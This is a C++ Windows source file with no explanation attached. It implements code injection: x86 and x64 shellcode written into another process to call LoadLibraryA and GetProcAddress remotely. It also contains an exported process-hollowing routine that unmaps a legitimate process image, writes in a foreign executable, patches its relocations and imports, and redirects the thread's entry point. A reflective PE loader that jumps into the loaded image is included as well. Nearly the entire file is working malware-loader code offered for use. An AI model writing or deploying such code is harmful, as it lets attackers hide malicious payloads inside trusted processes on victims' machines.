#include <iostream>
#include <Windows.h>
#include <winternl.h>
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib,"ntdll.lib")
#include "proc.h"
#include <memory>
HANDLE LoadRemoteLibrary(HANDLE RemoteProcHandle, LPCSTR ImportDllPathptr, bool is64)
{
	auto PtrSize = sizeof(void*);
	DWORD dwError = 0;
	auto DllPathSize = strlen(ImportDllPathptr) + 1;
	PVOID RImportDllPathptr = VirtualAllocEx(RemoteProcHandle, NULL, DllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (RImportDllPathptr == NULL)
	{
		return NULL;
	}
	SIZE_T NumsBytesWritten = 0;
	BOOL RESULT = WriteProcessMemory(RemoteProcHandle, RImportDllPathptr, ImportDllPathptr, DllPathSize, &NumsBytesWritten);
	if (RESULT == NULL)
	{
		return NULL;
	}

	PVOID DllAddress = NULL;
	if (is64)
	{
		HMODULE kerner32Handle = GetModuleHandle(L"kernel32.dll");
		LPVOID LoadLibraryAddr = (LPVOID)GetProcAddress(kerner32Handle, "LoadLibraryA");
		LPVOID LoadLibraryARetM = VirtualAllocEx(RemoteProcHandle, NULL, DllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (LoadLibraryARetM == NULL)
		{
			return NULL;
		}
		//Write Shellcode to the remote process which will call LoadLibraryA(Shellcode: LoadLibraryA.asm)
		// @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
		char shellcode_1[] = { '\x53', '\x48', '\x89', '\xe3', '\x48', '\x83', '\xec', '\x20', '\x66', '\x83', '\xe4', '\xc0', '\x48', '\xb9' };
		char shellcode_2[] = { '\x48','\xba' };
		char shellcode_3[] = { '\xff','\xd2' ,'\x48' ,'\xba' };
		char shellcode_4[] = { '\x48','\x89' ,'\x02' ,'\x48' ,'\x89' ,'\xdc' ,'\x5b','\xc3' };
		auto shellcodesLength = sizeof(shellcode_1) + sizeof(shellcode_2) + sizeof(shellcode_3) + sizeof(shellcode_4) + 3 * PtrSize;
		byte* SCPSMem = new byte[shellcodesLength];
		byte* SCPSMemOriginal = SCPSMem;
		memcpy(SCPSMem, shellcode_1, sizeof(shellcode_1));
		SCPSMem += sizeof(shellcode_1);
		memcpy(SCPSMem, &RImportDllPathptr, PtrSize);
		SCPSMem += PtrSize;
		memcpy(SCPSMem, shellcode_2, sizeof(shellcode_2));
		SCPSMem += sizeof(shellcode_2);
		memcpy(SCPSMem, &LoadLibraryAddr, PtrSize);
		SCPSMem += PtrSize;
		memcpy(SCPSMem, shellcode_3, sizeof(shellcode_3));
		SCPSMem += sizeof(shellcode_3);
		memcpy(SCPSMem, &LoadLibraryARetM, PtrSize);
		SCPSMem += PtrSize;
		memcpy(SCPSMem, shellcode_4, sizeof(shellcode_4));
		SCPSMem += sizeof(shellcode_4);
		LPVOID RSCAddr = VirtualAllocEx(RemoteProcHandle, NULL, shellcodesLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (RSCAddr == FALSE)
		{
			return NULL;
		}
		BOOL Success = WriteProcessMemory(RemoteProcHandle, RSCAddr, SCPSMemOriginal, shellcodesLength, &NumsBytesWritten);
		if (Success == FALSE || NumsBytesWritten != shellcodesLength)
		{
			return NULL;
		}
		DWORD threadId = 0;
		HANDLE RThreadHandle = CreateRemoteThread(RemoteProcHandle, NULL, 1024, (LPTHREAD_START_ROUTINE)RSCAddr, NULL, NULL, &threadId);
		
		DWORD Result = WaitForSingleObject(RThreadHandle, 20000);
		if (Result != 0)
		{
			return NULL;
		}
		byte* ReturnValMem = new byte[PtrSize];
		Result = ReadProcessMemory(RemoteProcHandle, LoadLibraryARetM, ReturnValMem, PtrSize, &NumsBytesWritten);
		if (Result == 0 || NumsBytesWritten == 0)
		{
			return NULL;
		}

		DllAddress = *(LPVOID*)ReturnValMem;
		VirtualFreeEx(RemoteProcHandle, LoadLibraryARetM, 0, MEM_RELEASE);
		VirtualFreeEx(RemoteProcHandle, RSCAddr, 0, MEM_RELEASE);
		delete[] ReturnValMem;
		return DllAddress;
	}
	else
	{
		unsigned char shellcode[] = {
				0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x1C, 0x31, 0xF6, 0x56, 0x68,
				0x61, 0x72, 0x79, 0x41, 0x68, 0x4C, 0x69, 0x62, 0x72, 0x68, 0x4C, 0x6F, 0x61, 0x64, 0x89, 0x65,
				0xFC, 0x31, 0xF6, 0x64, 0x8B, 0x5E, 0x30, 0x8B, 0x5B, 0x0C, 0x8B, 0x5B, 0x14, 0x8B, 0x1B, 0x8B,
				0x1B, 0x8B, 0x5B, 0x10, 0x89, 0x5D, 0xF8, 0x8B, 0x43, 0x3C, 0x01, 0xD8, 0x8B, 0x40, 0x78, 0x01,
				0xD8, 0x8B, 0x48, 0x24, 0x01, 0xD9, 0x89, 0x4D, 0xF4, 0x8B, 0x78, 0x20, 0x01, 0xDF, 0x89, 0x7D,
				0xF0, 0x8B, 0x50, 0x1C, 0x01, 0xDA, 0x89, 0x55, 0xEC, 0x8B, 0x50, 0x14, 0x31, 0xC0, 0x8B, 0x7D,
				0xF0, 0x8B, 0x75, 0xFC, 0x31, 0xC9, 0xFC, 0x8B, 0x3C, 0x87, 0x01, 0xDF, 0x66, 0x83, 0xC1, 0x08,
				0xF3, 0xA6, 0x74, 0x07, 0x40, 0x39, 0xD0, 0x72, 0xE5, 0xEB, 0x23, 0x8B, 0x4D, 0xF4, 0x8B, 0x55,
				0xEC, 0x66, 0x8B, 0x04, 0x41, 0x8B, 0x04, 0x82, 0x01, 0xD8, 0x89, 0x45, 0xE8, 0x83, 0xE4, 0xC0,
				0x68, 0x41, 0x41, 0x41, 0x41, 0xFF, 0xD0, 0xB9, 0x41, 0x41, 0x41, 0x41, 0x89, 0x01, 0x89, 0xEC,
				0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58, 0xC3 };
		LPVOID LoadLibraryARetM = VirtualAllocEx(RemoteProcHandle, NULL, DllPathSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (LoadLibraryARetM == NULL)
		{
			std::cout << "Alloc LoadLibraryARetM Failed!\n";
			return NULL;
		}
		*(UINT*)(&shellcode[16 * 9 + (2 - 1)]) = (UINT)RImportDllPathptr;
		*(UINT*)(&shellcode[16 * 9 + (9 - 1)]) = (UINT)LoadLibraryARetM;
		// the first pointer(Name of Dll) in 16*9+2 -> index= [16*9+(2-1)]
		// the second pointer(Ret Address) in 16*9+9 -> index=[16*9+(9-1)]
		LPVOID shellcodeAddr = VirtualAllocEx(RemoteProcHandle, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (shellcodeAddr == FALSE)
		{
			std::cout << "Alloc shellcodeAddr Failed!\n";
			return NULL;
		}
		BOOL Success = WriteProcessMemory(RemoteProcHandle, shellcodeAddr, shellcode, sizeof(shellcode), &NumsBytesWritten);
		if (Success == FALSE || NumsBytesWritten != sizeof(shellcode))
		{
			std::cout << "WriteProcessMemory Failed!\n";
			return NULL;
		}
		DWORD threadId = 0;
		HANDLE RThreadHandle = CreateRemoteThread(RemoteProcHandle, NULL, 0xffff, (LPTHREAD_START_ROUTINE)shellcodeAddr, RImportDllPathptr, NULL, &threadId);
		dwError = GetLastError();
		if (RThreadHandle == NULL)
		{
			std::cout << "CreateRemoteThread Failed\n";
		}
		DWORD Result = WaitForSingleObject(RThreadHandle, 20000);
		if (Result != 0)
		{
			return NULL;
		}
		byte* ReturnValMem = new byte[4]{ 0 };
		Result = ReadProcessMemory(RemoteProcHandle, LoadLibraryARetM, ReturnValMem, 4, &NumsBytesWritten);
		if (Result == 0 || NumsBytesWritten == 0)
		{
			return NULL;
		}

		UINT addressofRet = *(UINT*)ReturnValMem;
		DllAddress = (HMODULE)addressofRet;
		VirtualFreeEx(RemoteProcHandle, LoadLibraryARetM, 0, MEM_RELEASE);
		VirtualFreeEx(RemoteProcHandle, shellcodeAddr, 0, MEM_RELEASE);
		delete[] ReturnValMem;
		return DllAddress;
	}
}

LPVOID GetRemoteProcAddress(HANDLE hProcess, HMODULE hModule, LPCSTR lpProcName, UINT Ordinal, bool UseOrdinal, bool is64)
{
	SIZE_T PtrSize = sizeof(void*);
	DWORD FunctionNameSize = strlen(lpProcName) + 1;
	LPVOID RFuncNamePtr = NULL;
	if (!UseOrdinal)
	{
		RFuncNamePtr = VirtualAllocEx(hProcess, NULL, FunctionNameSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (RFuncNamePtr == NULL)
		{

			return NULL;
		}
		SIZE_T NumBytesWritten = 0;
		BOOL Result = WriteProcessMemory(hProcess, RFuncNamePtr, lpProcName, FunctionNameSize, &NumBytesWritten);
		if (Result == 0 || NumBytesWritten != FunctionNameSize)
		{

			return NULL;
		}
		if (NumBytesWritten != FunctionNameSize)
		{

			return NULL;
		}
	}
	else
	{
		RFuncNamePtr = (LPVOID)IMAGE_ORDINAL(Ordinal);

	}
	if (is64)
	{
		HMODULE kernel32Handle = GetModuleHandle(L"kernel32.dll");
		LPVOID GetProcAddressAddr = GetProcAddress(kernel32Handle, "GetProcAddress");
		LPVOID GetProcAddressRetMem = VirtualAllocEx(hProcess, NULL, PtrSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (GetProcAddressRetMem == NULL)
		{

			return NULL;
		}
		char GetProcAddressSC1[] = { '\x53','\x48', '\x89', '\xe3', '\x48', '\x83', '\xec', '\x20', '\x66', '\x83', '\xe4', '\xc0','\x48','\xb9' };
		char GetProcAddressSC2[] = { '\x48','\xba' };
		char GetProcAddressSC3[] = { '\x48', '\xb8' };
		char GetProcAddressSC4[] = { '\xff', '\xd0', '\x48', '\xb9' };
		char GetProcAddressSC5[] = { '\x48', '\x89', '\x01', '\x48', '\x89', '\xdc', '\x5b', '\xc3' };
		SIZE_T SCLength = sizeof(GetProcAddressSC1) + sizeof(GetProcAddressSC2) + sizeof(GetProcAddressSC3) + sizeof(GetProcAddressSC4) + sizeof(GetProcAddressSC5) + PtrSize * 4;
		byte* SCPSMem = new byte[SCLength];
		byte* SCPSMemOriginal = SCPSMem;
		memcpy(SCPSMem, GetProcAddressSC1, sizeof(GetProcAddressSC1));
		SCPSMem += sizeof(GetProcAddressSC1);
		memcpy(SCPSMem, &hModule, PtrSize);
		SCPSMem += PtrSize;
		memcpy(SCPSMem, GetProcAddressSC2, sizeof(GetProcAddressSC2));
		SCPSMem += sizeof(GetProcAddressSC2);
		memcpy(SCPSMem, &RFuncNamePtr, PtrSize);
		SCPSMem += PtrSize;
		memcpy(SCPSMem, GetProcAddressSC3, sizeof(GetProcAddressSC3));
		SCPSMem += sizeof(GetProcAddressSC3);
		memcpy(SCPSMem, &GetProcAddressAddr, PtrSize);
		SCPSMem += PtrSize;
		memcpy(SCPSMem, GetProcAddressSC4, sizeof(GetProcAddressSC4));
		SCPSMem += sizeof(GetProcAddressSC4);
		memcpy(SCPSMem, &GetProcAddressRetMem, PtrSize);
		SCPSMem += PtrSize;
		memcpy(SCPSMem, GetProcAddressSC5, sizeof(GetProcAddressSC5));
		SCPSMem += sizeof(GetProcAddressSC5);

		LPVOID RSCAddr = VirtualAllocEx(hProcess, NULL, SCLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (RSCAddr == NULL)
		{
			return NULL;
		}
		SIZE_T NumByteshaveWritten = 0;
		BOOL Result = WriteProcessMemory(hProcess, RSCAddr, SCPSMemOriginal, SCLength, &NumByteshaveWritten);
		if (Result == NULL || NumByteshaveWritten != SCLength)
		{
			return NULL;
		}
		DWORD threadId;
		HANDLE RemoteThreadHandle = CreateRemoteThread(hProcess, NULL, 0xFFFF, (LPTHREAD_START_ROUTINE)RSCAddr, NULL, NULL, &threadId);
		Result = WaitForSingleObject(RemoteThreadHandle, 20000);
		if (Result != 0)
		{

			return NULL;
		}
		byte* ReturnValMem = new byte[PtrSize]{ 0 };
		Result = ReadProcessMemory(hProcess, GetProcAddressRetMem, ReturnValMem, PtrSize, &NumByteshaveWritten);
		if (Result == FALSE || NumByteshaveWritten != PtrSize)
		{
			return NULL;
		}
		FARPROC ProcAddress = *(FARPROC*)ReturnValMem;
		VirtualFreeEx(hProcess, RSCAddr, 0, MEM_RELEASE);
		VirtualFreeEx(hProcess, GetProcAddressRetMem, 0, MEM_RELEASE);
		if (!UseOrdinal)
			VirtualFreeEx(hProcess, RFuncNamePtr, 0, MEM_RELEASE);
		return ProcAddress;

	}
	else
	{
		unsigned char shellcode[] = {
			0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x55, 0x89, 0xE5, 0x83, 0xEC, 0x1C, 0x31, 0xF6, 0x68, 0x73,
			0x73, 0x00, 0x00, 0x68, 0x64, 0x64, 0x72, 0x65, 0x68, 0x72, 0x6F, 0x63, 0x41, 0x68, 0x47, 0x65,
			0x74, 0x50, 0x89, 0x65, 0xFC, 0x31, 0xF6, 0x64, 0x8B, 0x5E, 0x30, 0x8B, 0x5B, 0x0C, 0x8B, 0x5B,
			0x14, 0x8B, 0x1B, 0x8B, 0x1B, 0x8B, 0x5B, 0x10, 0x89, 0x5D, 0xF8, 0x8B, 0x43, 0x3C, 0x01, 0xD8,
			0x8B, 0x40, 0x78, 0x01, 0xD8, 0x8B, 0x48, 0x24, 0x01, 0xD9, 0x89, 0x4D, 0xF4, 0x8B, 0x78, 0x20,
			0x01, 0xDF, 0x89, 0x7D, 0xF0, 0x8B, 0x50, 0x1C, 0x01, 0xDA, 0x89, 0x55, 0xEC, 0x8B, 0x50, 0x14,
			0x31, 0xC0, 0x8B, 0x7D, 0xF0, 0x8B, 0x75, 0xFC, 0x31, 0xC9, 0xFC, 0x8B, 0x3C, 0x87, 0x01, 0xDF,
			0x66, 0x83, 0xC1, 0x08, 0xF3, 0xA6, 0x74, 0x07, 0x40, 0x39, 0xD0, 0x72, 0xE5, 0xEB, 0x28, 0x8B,
			0x4D, 0xF4, 0x8B, 0x55, 0xEC, 0x66, 0x8B, 0x04, 0x41, 0x8B, 0x04, 0x82, 0x01, 0xD8, 0x89, 0x45,
			0xE8, 0x83, 0xE4, 0xC0, 0x68, 0x41, 0x41, 0x41, 0x41, 0x68, 0x41, 0x41, 0x41, 0x41, 0xFF, 0xD0,
			0xB9, 0x41, 0x41, 0x41, 0x41, 0x89, 0x01, 0x89, 0xEC, 0x5D, 0x5F, 0x5E, 0x5A, 0x59, 0x5B, 0x58,
			0xC3 };
		LPVOID GetProcAddressRetMem = VirtualAllocEx(hProcess, NULL, PtrSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (GetProcAddressRetMem == NULL)
		{
			std::cout << "Alloc GetProcAddressRetMem Failed\n";
			return NULL;
		}

		//write the RFuncNamePtr to shellcode array
		*(UINT*)(&shellcode[16 * 9 + (6 - 1)]) = (UINT)RFuncNamePtr;
		*(UINT*)(&shellcode[16 * 9 + (11 - 1)]) = (UINT)hModule;
		*(UINT*)(&shellcode[16 * 10 + (2 - 1)]) = (UINT)GetProcAddressRetMem;
		LPVOID ShellcodeAddr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		if (ShellcodeAddr == NULL)
		{
			std::cout << "Alloc ShellcodeAddr Failed!\n";
			return NULL;
		}
		SIZE_T NumByteshaveWritten = 0;
		BOOL Result = WriteProcessMemory(hProcess, ShellcodeAddr, shellcode, sizeof(shellcode), &NumByteshaveWritten);
		if (Result == NULL || NumByteshaveWritten != sizeof(shellcode))
		{
			std::cout << "WriteProcessMemory Failed";
			return NULL;
		}
		DWORD threadId;
		HANDLE RemoteThreadHandle = CreateRemoteThread(hProcess, NULL, 1024, (LPTHREAD_START_ROUTINE)ShellcodeAddr, NULL, NULL, &threadId);
		Result = WaitForSingleObject(RemoteThreadHandle, 20000);
		if (Result != 0)
		{
			return NULL;
		}

		byte* ReturnValMem = new byte[4]{ 0 };
		Result = ReadProcessMemory(hProcess, GetProcAddressRetMem, ReturnValMem, 4, &NumByteshaveWritten);
		if (Result == FALSE || NumByteshaveWritten != 4)
		{
			return NULL;
		}
		FARPROC ProcAddress = *(FARPROC*)ReturnValMem;
		VirtualFreeEx(hProcess, ShellcodeAddr, 0, MEM_RELEASE);
		VirtualFreeEx(hProcess, GetProcAddressRetMem, 0, MEM_RELEASE);
		if (!UseOrdinal)
			VirtualFreeEx(hProcess, RFuncNamePtr, 0, MEM_RELEASE);
		return ProcAddress;
	}

}

using NtUnmapViewOfSection = NTSTATUS(WINAPI*)(HANDLE, PVOID);

typedef struct BASE_RELOCATION_BLOCK {
	DWORD PageAddress;
	DWORD BlockSize;
} BASE_RELOCATION_BLOCK, * PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
	USHORT Offset : 12;
	USHORT Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;
extern "C" __declspec(dllexport) unsigned int process_hollowing(void* lpPEBytes, PPROCESS_INFORMATION pi)
{
	enum { is64 = false, offset = 0x8 };
	PROCESS_BASIC_INFORMATION* pbi = new PROCESS_BASIC_INFORMATION();
	DWORD returnLenght = 0;
	HANDLE hProcess = pi->hProcess;

	// get destination imageBase offset address from the PEB
	NtQueryInformationProcess(hProcess, ProcessBasicInformation, pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLenght);
	DWORD pebImageBaseOffset = (ULONG_PTR)pbi->PebBaseAddress + offset;

	// get destination imageBaseAddress
	LPVOID ImageBase = 0;
	DWORD dwBytes;
	SIZE_T bytesRead = NULL;
	ReadProcessMemory(hProcess, (LPCVOID)pebImageBaseOffset, &ImageBase, sizeof(void*), &bytesRead);
	Sleep(100);
	// read source file - this is the file that will be executed inside the hollowed process
	LPDWORD fileBytesRead = 0;
	

	// get source image size
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER)lpPEBytes;
	PIMAGE_NT_HEADERS lpNtHdr = (PIMAGE_NT_HEADERS)((ULONG_PTR)lpPEBytes + lpDosHdr->e_lfanew);
	SIZE_T size_image = lpNtHdr->OptionalHeader.SizeOfImage;

	// carve out the destination image
	NtUnmapViewOfSection myNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtUnmapViewOfSection"));
	myNtUnmapViewOfSection(hProcess, ImageBase);

	ULONG_PTR remote_image = (ULONG_PTR)VirtualAllocEx(hProcess, ImageBase, size_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	ULONG_PTR local_image = (ULONG_PTR)VirtualAlloc(NULL, size_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	LONG_PTR delta = remote_image - lpNtHdr->OptionalHeader.ImageBase;
	lpNtHdr->OptionalHeader.ImageBase = remote_image;
	memcpy((void*)local_image, lpDosHdr, lpNtHdr->OptionalHeader.SizeOfHeaders);
	WriteProcessMemory(hProcess, (void*)remote_image, lpDosHdr, lpNtHdr->OptionalHeader.SizeOfHeaders, &bytesRead);
	auto error_code = GetLastError();
	int number_sections = lpNtHdr->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER lpSecHdr = (PIMAGE_SECTION_HEADER)(lpNtHdr->FileHeader.SizeOfOptionalHeader + (ULONG_PTR)&lpNtHdr->OptionalHeader);
	for (int i = 0; i < number_sections; i++)
	{
		PVOID destinationSectionLocation = (PVOID)((ULONG_PTR)remote_image + lpSecHdr->VirtualAddress);
		PVOID local_address_section = (PVOID)((ULONG_PTR)local_image + lpSecHdr->VirtualAddress);
		PVOID sourceSectionLocation = (PVOID)((ULONG_PTR)lpPEBytes + lpSecHdr->PointerToRawData);
		WriteProcessMemory(hProcess, destinationSectionLocation, sourceSectionLocation, lpSecHdr->SizeOfRawData, NULL);
		memcpy(local_address_section, sourceSectionLocation, lpSecHdr->SizeOfRawData);
		lpSecHdr++;
	}
	lpSecHdr = (PIMAGE_SECTION_HEADER)(lpNtHdr->FileHeader.SizeOfOptionalHeader + (ULONG_PTR)&lpNtHdr->OptionalHeader);

	IMAGE_DATA_DIRECTORY relocationTable = lpNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	for (int i = 0; i < lpNtHdr->FileHeader.NumberOfSections; i++)
	{
		BYTE* relocSectionName = (BYTE*)".reloc";
		if (memcmp(lpSecHdr->Name, relocSectionName, 5) != 0)
		{
			lpSecHdr++;
			continue;
		}

		DWORD sourceRelocationTableRaw = lpSecHdr->PointerToRawData;
		DWORD relocationOffset = 0;

		while (relocationOffset < relocationTable.Size) {
			PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((ULONG_PTR)lpPEBytes + sourceRelocationTableRaw + relocationOffset);
			relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
			DWORD relocationEntryCount = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
			PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((ULONG_PTR)lpPEBytes + sourceRelocationTableRaw + relocationOffset);

			for (DWORD y = 0; y < relocationEntryCount; y++)
			{
				relocationOffset += sizeof(BASE_RELOCATION_ENTRY);

				if (relocationEntries[y].Type == 0)
				{
					continue;
				}

				DWORD patchAddress = relocationBlock->PageAddress + relocationEntries[y].Offset;
				DWORD patchedBuffer = 0;
				ReadProcessMemory(hProcess, (LPCVOID)((ULONG_PTR)remote_image + patchAddress), &patchedBuffer, sizeof(ULONG_PTR), &bytesRead);
				patchedBuffer += delta;
				*(ULONG_PTR*)(local_image + patchAddress) += delta;
				WriteProcessMemory(hProcess, (PVOID)((ULONG_PTR)remote_image + patchAddress), &patchedBuffer, sizeof(ULONG_PTR), &bytesRead);
				error_code = GetLastError();
			}
		}
	}
	IMAGE_DATA_DIRECTORY dir_import_table = lpNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)(dir_import_table.VirtualAddress + local_image);
	const char* name_library = nullptr;
	HMODULE handle_module = nullptr;
	int number_Imped = 0;
	error_code = GetLastError();
	while (import_table->Name != NULL)
	{
		name_library = (const char*)(local_image + import_table->Name);

			handle_module = (HMODULE)LoadRemoteLibrary(hProcess, name_library, is64);
		if (handle_module == nullptr)
		{
			handle_module = (HMODULE)LoadRemoteLibrary(hProcess, name_library, is64);
			if (handle_module == nullptr)
			{
				std::cout << "LoadRemoetLibrary Failed";
				return 0;
			}
			
		}
		else
		{
			PIMAGE_THUNK_DATA thunk = nullptr;
			thunk = (PIMAGE_THUNK_DATA)(local_image + import_table->FirstThunk);
			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{
					thunk->u1.Function = (ULONG_PTR)GetRemoteProcAddress(hProcess, handle_module, "XXX", thunk->u1.Ordinal, true, is64);
				}
				else
				{

					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)(local_image + thunk->u1.AddressOfData);

					ULONG_PTR address_function = (ULONG_PTR)GetRemoteProcAddress(hProcess, handle_module, functionName->Name, NULL, false, is64);
					thunk->u1.Function = address_function;
				}
				number_Imped++;
				++thunk;
			}
		}
		import_table++;
	}

	WriteProcessMemory(hProcess, (void*)remote_image, (void*)local_image, size_image, &bytesRead);
	// get context of the dest process thread
	LPCONTEXT context = new CONTEXT();
	context->ContextFlags = CONTEXT_INTEGER;
	GetThreadContext(pi->hThread, context);

	// update dest image entry point to the new entry point of the source image and resume dest image thread
	DWORD patchedEntryPoint = (ULONG_PTR)remote_image + lpNtHdr->OptionalHeader.AddressOfEntryPoint;
	context->Eax = patchedEntryPoint;
	SetThreadContext(pi->hThread, context);
	ResumeThread(pi->hThread);
	Sleep(20000);
	return 0;
}



extern "C" __declspec(dllexport) unsigned int load_pe(unsigned long pe_base, unsigned long pe_size, unsigned long new_image_base)
{
	

	typedef typename PBASE_RELOCATION_BLOCK ptr_block_relocation;
	typedef typename BASE_RELOCATION_BLOCK block_relocation;
	typedef typename BASE_RELOCATION_ENTRY entry_relocation;
	typedef typename PBASE_RELOCATION_ENTRY ptr_entry_relocatin;
	typedef typename ULONG_PTR uint32_ptr;
	typedef typename LONG_PTR int32_ptr;
	typedef typename DWORD uint32_t;
	typedef typename BYTE byte;
	typedef typename PIMAGE_DOS_HEADER p_dos_header;
	typedef typename PIMAGE_NT_HEADERS p_nt_header;
	typedef typename PIMAGE_SECTION_HEADER ptr_section_header;
	typedef typename IMAGE_DATA_DIRECTORY directory_data;
	typedef typename PIMAGE_IMPORT_DESCRIPTOR ptr_descrptor_import;
	typedef typename HMODULE hmodule;
	typedef typename PIMAGE_THUNK_DATA ptr_thunk_data;
	p_dos_header ptr_DosHdr = reinterpret_cast<p_dos_header>(pe_base);
	p_nt_header ptr_NtHdr = reinterpret_cast<p_nt_header>((uint32_ptr)ptr_DosHdr + ptr_DosHdr->e_lfanew);
	uint32_ptr size_image = ptr_NtHdr->OptionalHeader.SizeOfImage;

	uint32_ptr image_base = (uint32_ptr)VirtualAlloc(NULL, size_image, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	int32_ptr delta = new_image_base - ptr_NtHdr->OptionalHeader.ImageBase ;
	ptr_NtHdr->OptionalHeader.ImageBase = new_image_base;
	uint32_ptr size_headers = ptr_NtHdr->OptionalHeader.SizeOfHeaders;
	memcpy((void*)image_base, (void*)pe_base, size_headers);
	uint32_t number_sections = ptr_NtHdr->FileHeader.NumberOfSections;
	ptr_section_header lpSecHdr = IMAGE_FIRST_SECTION(ptr_NtHdr);
	for (unsigned int i = 0; i < number_sections; i++)
	{
		uint32_ptr address_section = image_base + lpSecHdr->VirtualAddress;
		uint32_ptr address_rawsection = pe_base + lpSecHdr->PointerToRawData;
		uint32_ptr size_section = lpSecHdr->SizeOfRawData;
		memcpy((void*)address_section, (void*)address_rawsection, size_section);
		lpSecHdr++;
	}
	lpSecHdr = IMAGE_FIRST_SECTION(ptr_NtHdr);
	for (int i = 0; i < ptr_NtHdr->FileHeader.NumberOfSections; i++)
	{
		byte* relocSectionName = (byte*)".reloc";
		if(memcmp(lpSecHdr->Name, relocSectionName, 5) != 0)
		{
			lpSecHdr++;
			continue;
		}
	}

	directory_data dir_relocations = ptr_NtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	uint32_ptr address_relocations = dir_relocations.VirtualAddress + image_base;
	uint32_ptr processed_relocation = 0;

	while (processed_relocation < dir_relocations.Size)
	{
		ptr_block_relocation pblock_relocation = (ptr_block_relocation)(address_relocations + processed_relocation);
		processed_relocation += sizeof(block_relocation);

		uint32_t count_relocation = (pblock_relocation->BlockSize - sizeof(block_relocation)) / sizeof(entry_relocation);
		ptr_entry_relocatin entries_relocation = (ptr_entry_relocatin)(address_relocations + processed_relocation);

		for (uint32_t i = 0; i < count_relocation; i++)
		{
			processed_relocation += sizeof(entry_relocation);

			if (entries_relocation[i].Type == 0)
			{
				continue;
			}

			uint32_ptr rva_relocation = pblock_relocation->PageAddress + entries_relocation[i].Offset;
			*(int32_ptr*)(rva_relocation + image_base) += delta;
		}
	}
	directory_data dir_import_table = ptr_NtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	ptr_descrptor_import import_table = (ptr_descrptor_import)(dir_import_table.VirtualAddress + image_base);
	const char* name_library = nullptr;
	hmodule handle_module = nullptr;
	int number_Imped = 0;
	while (import_table->Name != NULL)
	{
		name_library = (const char*)(image_base + import_table->Name);
		handle_module = LoadLibraryA(name_library);

		if (handle_module == nullptr)
		{
			return 0;
		}
		else
		{

			ptr_thunk_data thunk = nullptr;
			thunk = (ptr_thunk_data)(image_base + import_table->FirstThunk);

			while (thunk->u1.AddressOfData != NULL)
			{
				if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal))
				{

					const char* functionOrdinal = (const char*)IMAGE_ORDINAL(thunk->u1.Ordinal);
					thunk->u1.Function = (uint32_ptr)GetProcAddress(handle_module, functionOrdinal);

				}
				else
				{

					PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)(image_base + thunk->u1.AddressOfData);
			
					uint32_ptr address_function = (uint32_ptr)GetProcAddress(handle_module, functionName->Name);
					thunk->u1.Function = address_function;
				}
				number_Imped++;
				++thunk;
			}
		}
		import_table++;
	}	
	memcpy((void*)(new_image_base), (void*)image_base, size_image);
	//VirtualFree((void*)image_base, 0, MEM_RELEASE);
	uint32_ptr entry = new_image_base + ptr_NtHdr->OptionalHeader.AddressOfEntryPoint;
	__asm {
		jmp entry
	}
}